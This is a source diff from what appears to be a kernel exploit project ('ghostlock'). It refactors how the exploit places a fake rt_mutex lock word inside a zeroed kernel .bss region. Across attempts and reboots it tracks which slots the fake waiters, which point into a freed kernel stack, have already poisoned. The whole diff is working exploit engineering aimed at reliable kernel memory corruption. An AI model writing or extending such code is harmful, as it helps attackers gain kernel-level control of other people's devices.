@@ -10,6 +10,7 @@
 #include <string>
 #include <utility>
 
+#include "route/lock_anchor.h"
 #include "route/route_policy.hpp"
 #include "session/runtime_config.h"
 #include "session/runtime_paths.h"
@@ -379,198 +380,6 @@ namespace ghostlock::route {
         }
     }
 
-    /* The fake rt_mutex is 0x20 bytes here (wait_lock, two rb words, owner)
-     * and only the rb words are written, so slots cannot overlap. The region is
-     * the page-sized dump_skip.zeroes, boxed in by live symbols: past its end
-     * must be refused. All three numbers come from the profile. */
-    static constexpr uintptr_t kLockAnchorStrideDefault = 0x20;
-    static constexpr uintptr_t kLockAnchorBytesDefault = 0x1000;
-    /* `owner` at +0x18: closer slots would share a word. */
-    static constexpr uintptr_t kLockAnchorStrideMin = 0x20;
-
-    struct AnchorGeometry {
-        uintptr_t stride;
-        uintptr_t bytes;
-        uintptr_t slots;
-    };
-
-    /* False when the two keys cannot describe one grid; the caller must fail,
-     * not fall back. */
-    static bool anchor_geometry(const profile::SelectStackLayout &layout,
-                                AnchorGeometry *out) {
-        const uintptr_t stride = layout.lock_anchor_stride
-                                     ? static_cast<uintptr_t>(*layout.lock_anchor_stride)
-                                     : kLockAnchorStrideDefault;
-        const uintptr_t bytes = layout.lock_anchor_bytes
-                                    ? static_cast<uintptr_t>(*layout.lock_anchor_bytes)
-                                    : kLockAnchorBytesDefault;
-        if (stride < kLockAnchorStrideMin || bytes == 0 || bytes % stride != 0) {
-            pr_error("[route] anchor geometry unusable (bytes=0x%llx stride=0x%llx): bytes must be a "
-                     "non-zero multiple of the stride, and the stride at least 0x%llx -- the fake "
-                     "rt_mutex reaches owner@+0x18, so closer slots share a word\n",
-                     static_cast<unsigned long long>(bytes),
-                     static_cast<unsigned long long>(stride),
-                     static_cast<unsigned long long>(kLockAnchorStrideMin));
-            return false;
-        }
-        out->stride = stride;
-        out->bytes = bytes;
-        out->slots = bytes / stride;
-        return true;
-    }
-
-    static bool read_boot_id(char *out, size_t capacity) {
-        FILE *f = fopen("/proc/sys/kernel/random/boot_id", "r");
-        if (!f) return false;
-        const bool ok = fgets(out, static_cast<int32_t>(capacity), f) != nullptr;
-        fclose(f);
-        if (!ok) return false;
-        for (size_t i = 0; out[i] != '\0'; i++) {
-            if (out[i] == '\n') {
-                out[i] = '\0';
-                break;
-            }
-        }
-        return out[0] != '\0';
-    }
-
-    /* Persist the reservation before the slot is handed out: that is what
-     * stops a later process from being given it again. The grid is stamped
-     * too, so a file written under a different stride/region is not resumed. */
-    static bool write_anchor_state(const std::string &path, const char *boot_id,
-                                   uintptr_t next_slot, uintptr_t slots) {
-        FILE *f = fopen(path.c_str(), "w");
-        if (!f) return false;
-        const int32_t written = fprintf(f, "%s %llu %llu\n", boot_id,
-                                        static_cast<unsigned long long>(next_slot),
-                                        static_cast<unsigned long long>(slots));
-        const bool ok = written > 0 && fflush(f) == 0;
-        fclose(f);
-        return ok;
-    }
-
-    /* Boot-scoped slot allocator, monotonic across processes. A run poisons
-     * every slot it uses: the fake waiter is enqueued into lock->waiters and
-     * points into a freed kernel stack, so a later walk reaching it data-aborts.
-     * The chunk's END is persisted before any slot in it is handed out; a run
-     * that dies mid-chunk only skips the rest of the chunk. */
-    static constexpr uintptr_t kLockAnchorChunk = 8;
-
-    static uintptr_t select_stack_anchor_slot(const AnchorGeometry &geom) {
-        static bool loaded = false;
-        static char boot_id[64] = {};
-        static std::string state_path;
-        static uintptr_t next = 0;      /* next slot to hand out */
-        static uintptr_t reserved = 0;  /* high-water mark already in the file */
-        static uintptr_t loaded_slots = 0;
-
-        if (loaded && loaded_slots != geom.slots) {
-            /* One profile per process today; a second grid against the first's
-             * high-water mark would hand out slots the file does not describe. */
-            pr_error("[route] anchor geometry changed mid-process (%llu -> %llu slots); "
-                     "refusing to reuse this boot's slot state\n",
-                     static_cast<unsigned long long>(loaded_slots),
-                     static_cast<unsigned long long>(geom.slots));
-            return geom.slots;
-        }
-
-        if (!loaded) {
-            loaded = true;
-            loaded_slots = geom.slots;
-            state_path = config::anchor_state_file(config::runtime_config_snapshot().home_dir);
-            if (!read_boot_id(boot_id, sizeof boot_id)) {
-                /* Not fatal: without a boot id we fall back to comparing the
-                 * sentinel with itself, i.e. "same boot", which is the
-                 * conservative reading of an unreadable /proc. */
-                std::strncpy(boot_id, "unknown-boot", sizeof boot_id - 1);
-            }
-
-            char stored_boot[64] = {};
-            unsigned long long stored_next = 0;
-            unsigned long long stored_slots = 0;
-            bool have_boot = false;
-            bool have_all = false;
-            if (FILE *f = fopen(state_path.c_str(), "r")) {
-                /* The boot id alone is authoritative; the rest is only meaningful
-                 * within the boot that wrote it, so an older writer's file (say
-                 * one without the grid field) still gets its boot id honoured. */
-                have_boot = fscanf(f, "%63s", stored_boot) == 1;
-                if (have_boot) {
-                    have_all = fscanf(f, "%llu %llu", &stored_next, &stored_slots) == 2;
-                }
-                fclose(f);
-            }
-            const bool same_boot = have_boot && std::strcmp(stored_boot, boot_id) == 0;
-            const bool grid_ok = have_all && stored_slots == geom.slots;
-
-            if (same_boot && grid_ok && stored_next <= geom.slots) {
-                next = static_cast<uintptr_t>(stored_next);
-                pr_info("[route] anchor slots: %llu/%llu already spent this boot\n",
-                        static_cast<unsigned long long>(next),
-                        static_cast<unsigned long long>(geom.slots));
-            } else if (have_boot && !same_boot) {
-                /* A different boot id is proof the region was re-zeroed (.bss is
-                 * zeroed at boot), so slot 0 is pristine again whatever the rest
-                 * of the file says -- including a file from an older format. */
-                pr_info("[route] anchor slots: new boot, region zeroed again; "
-                        "starting at 0/%llu\n",
-                        static_cast<unsigned long long>(geom.slots));
-            } else if (same_boot && have_all) {
-                /* Same boot, untrustworthy grid or count: the region is still
-                 * poisoned and this file cannot say where the high-water mark is.
-                 * Refuse rather than guess. */
-                pr_error("[route] anchor state is not usable for this build "
-                         "(grid %llu vs %llu, next %llu); reboot the device and run again\n",
-                         stored_slots, static_cast<unsigned long long>(geom.slots),
-                         stored_next);
-                next = geom.slots;
-            } else if (config::runtime_config_snapshot().anchor_trusted) {
-                /* The app proved this install predates the boot: any run would
-                 * have written the file, so its absence means the region is
-                 * still zeroed. Withheld when the install postdates the boot --
-                 * then a previous install may have poisoned it. */
-                if (!write_anchor_state(state_path, boot_id, 0, geom.slots)) {
-                    pr_error("[route] anchor slot state is missing and cannot be created in %s; "
-                             "refusing to start from a slot this boot may already have spent\n",
-                             state_path.c_str());
-                    next = geom.slots;
-                } else {
-                    pr_info("[route] anchor slots: no state file and this install predates the "
-                            "boot; starting at 0/%llu\n",
-                            static_cast<unsigned long long>(geom.slots));
-                }
-            } else {
-                /* No usable reservation file, and there is no safe guess which
-                 * slots this boot already spent; 0 is the one slot a previous
-                 * run is guaranteed to have used. Refuse; a reboot re-zeroes
-                 * the region. */
-                pr_error("[route] anchor slot state missing/unusable (%s); cannot tell which "
-                         "slots this boot already spent -- reboot the device and run again\n",
-                         state_path.c_str());
-                next = geom.slots;
-            }
-        }
-
-        if (next >= geom.slots) return geom.slots;
-        if (next >= reserved) {
-            /* Persist the next chunk's end before handing out a slot from it, so
-             * a failed write retries rather than leaking an unrecorded slot. */
-            uintptr_t want = next + kLockAnchorChunk;
-            if (want > geom.slots) want = geom.slots;
-            if (!write_anchor_state(state_path, boot_id, want, geom.slots)) {
-                pr_error("[route] cannot record the anchor slot reservation in %s; refusing to "
-                         "hand out a slot a later process would be given again\n",
-                         state_path.c_str());
-                return geom.slots;
-            }
-            reserved = want;
-            pr_info("[route] anchor slots: reserved %llu..%llu of %llu\n",
-                    static_cast<unsigned long long>(next),
-                    static_cast<unsigned long long>(reserved - 1),
-                    static_cast<unsigned long long>(geom.slots));
-        }
-        return next++;
-    }
 
     static bool select_stack_build_fdsets(select_stack::SelectStackRoute *context,
                                           int32_t attempt) {
@@ -601,28 +410,14 @@ namespace ghostlock::route {
             uint64_t lock_word = session::g_exploit_session.heap.current.fake_lock;
             if (const auto anchor = context->layout.lock_anchor_image) {
                 /* Waiters die with the attempt: one fresh slot per attempt. */
-                AnchorGeometry geom = {};
-                if (!anchor_geometry(context->layout, &geom)) {
-                    anchor_ok = false;
-                } else if (const uintptr_t slot = select_stack_anchor_slot(geom);
-                           slot >= geom.slots) {
-                    pr_error("[route] anchor slot budget for this boot is spent (%llu slots of "
-                             "0x%llx bytes at stride 0x%llx, one per attempt); refusing to walk "
-                             "past the zeroed region into live .bss -- reboot to reset it\n",
-                             static_cast<unsigned long long>(geom.slots),
-                             static_cast<unsigned long long>(geom.bytes),
-                             static_cast<unsigned long long>(geom.stride));
+                uintptr_t slot = 0;
+                const uintptr_t anchored = anchor::acquire_lock_word(
+                    *anchor, context->layout.lock_anchor_bytes,
+                    context->layout.lock_anchor_stride, attempt, &slot);
+                if (anchored == 0) {
                     anchor_ok = false;
                 } else {
-                    const uintptr_t rotation = geom.stride * slot;
-                    lock_word = session::g_exploit_session.addresses.data_alias(
-                        static_cast<uintptr_t>(kernel::KIMAGE_TEXT_BASE + *anchor) + rotation);
-                    pr_info("[route] lock anchor: image +0x%llx (attempt %d, slot %llu, "
-                            "+0x%llx) -> direct map 0x%llx\n",
-                            static_cast<unsigned long long>(*anchor), attempt,
-                            static_cast<unsigned long long>(slot),
-                            static_cast<unsigned long long>(rotation),
-                            static_cast<unsigned long long>(lock_word));
+                    lock_word = anchored;
                 }
             }
 
